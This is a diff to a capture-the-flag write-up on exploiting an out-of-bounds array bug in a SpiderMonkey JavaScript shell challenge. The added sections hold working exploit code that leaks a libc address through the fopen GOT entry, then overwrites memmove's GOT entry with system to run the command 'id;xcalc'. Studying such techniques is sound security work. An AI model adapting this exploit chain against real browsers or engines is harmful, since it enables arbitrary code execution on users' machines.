@@ -168,7 +168,7 @@ lets find where are the "A" located in the memory.
 
 [3.png]
 
-We can observe the memory structure of the oob_Array as follows (details could read bpsec 's blog post for detail explanation):
+We can observe the memory structure of the oob_Array as follows (details plz read bpsec's blog post):
 
 
 The 0x2000 on the memory is the size of our array object.
@@ -187,6 +187,82 @@ for (i=0; i<0x2000; i++)
                 break;
         }
 }
+```
+
+[4.png]
+
+Next step is to leak out some pointer to calculate the offset 
+
+This time since we are using the js engine, it didn't compiled with PIE , we can directly use pwntools or IDA PRO to obtain the address of the GOT, if we are attack the real firefox browser, we need to find the code base.
+
+To leak the code base, in this chal, we can leak the <emptyElementsHeader+16> , which located closely to our oob array
+
+After some calculation we obtained the location of the GOT on the program. 
+
+This time, I choose to leak the libc by reading the GOT of fopen.(There are some other options, like memmove but with unknown reasons, it didn't called on direct execute mode)
+
+```js
+console.log("address of the buffer")
+p_i2(oob_Array[uint32_baseaddress_offset]);
+// emptyelelement header 
+// use for de PIE
+console.log("address of emptyelement")
+p_i2(oob_Array[uint32_baseaddress_offset-4]);
+
+//>>> hex(e.got["memmove"])
+//'0x2354040'
+//>>> hex(e.got["system"])
+//'0x23540b0'
+
+
+// on js shell, we just leak the no aslr memove
+// then calculate the offset
+// dont know why it did not call memmove in headless mode
+fopen_got=[0,0x2354050]
+fopen_leak=read64(fopen_got);
+console.log("leaked fopen");
+debug_log(fopen_leak)
+print(hex(fopen_leak))
+//libc from system libc
+
+libc_base= [fopen_leak[0],fopen_leak[1]-0x6dd70]
+system =[libc_base[0],libc_base[1]+0x45390]
+
+```
+
+
+Last step is to carry out GOT hijacking 
+
+Following saelo 's approach on 33C3 feuerfuchs's exploit, we will hijack memmove and change it to system, then call .copyWithin(0,1) to trigger system(command)
+
+
+```js
+fopen_got=[0,0x2354050]
+fopen_leak=read64(fopen_got);
+console.log("leaked fopen");
+debug_log(fopen_leak)
+print(hex(fopen_leak))
+//libc from system libc
+
+libc_base= [fopen_leak[0],fopen_leak[1]-0x6dd70]
+system =[libc_base[0],libc_base[1]+0x45390]
+
+//trick from saelo
+var target = new Uint8Array(100);
+var cmd = "id;xcalc";
+for (var i = 0; i < cmd.length; i++) {
+    target[i] = cmd.charCodeAt(i);
+}
+// got hijacking
+memmove_got=[0,0x2354040]
+write4(memmove_got,system)
+
+
+//shell 
+console.log("[+] PWNED")
+target.copyWithin(0,1)
+
+
 ```
 
 # Reference
